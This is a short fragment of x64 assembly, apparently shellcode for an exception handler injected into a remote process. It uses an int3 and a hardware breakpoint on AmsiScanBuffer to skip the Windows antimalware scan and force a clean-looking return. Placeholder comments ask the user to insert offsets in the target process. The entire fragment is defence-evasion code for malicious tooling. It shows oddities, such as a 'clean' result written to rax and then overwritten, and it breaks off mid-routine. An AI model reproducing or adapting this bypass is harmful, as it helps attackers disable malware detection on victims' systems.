
; 1. Check if the exception is from our int3 (RIP check)
    mov rdx, [rcx + 8]       ; (ptr to CONTEXT)
    mov rax, [rdx + 0xF8]    ; (ctx->RIP)
    mov r11, 0h              ; (offset 13) PUT HERE THE OFFSET OF YOUR int3 IN the remote process (relative to the module base)
    mov r12, 0h              ; (offset 20) PUT HERE THE OFFSET OF THE AMSI_SCAN_BUFFER in the remote process (relative to the module base)
    cmp rax, r11
    je set_hwbp              ; JMP to CONTINUE_SEARCH if not our int3
    cmp rax, r12
    jne rip+2A               ; JMP to CONTINUE_SEARCH if not our HWBP trigger

    mov rax, 0               ;  (AMSI_RESULT_CLEAN) -> [rdx+78] (RAX of ctx)
    mov rax, [rdx+98]        ;  (ctx's RSP)
    mov rax, [rax]           ;  (RetAddr of amsiscanbuffer)
    mov [rdx+F8], rax        ;  (RIP = RetAddr)
    add [rdx+98], 8          ;  (RSP += 8)
    mov eax, 0xffffffff      ;  (EXCEPTION_CONTINUE_EXECUTION)
    ret

    ; RIP check jne target (if not AmsiScanBuffer) -> return CONTINUE_SEARCH
    xor eax, eax             ;(EXCEPTION_CONTINUE_SEARCH)
    ret

set_hwbp: 
    mov rdx, [rcx + 8]       ; (ptr to CONTEXT)
    mov rax, [rdx + 0xF8]    ; (ctx->RIP)   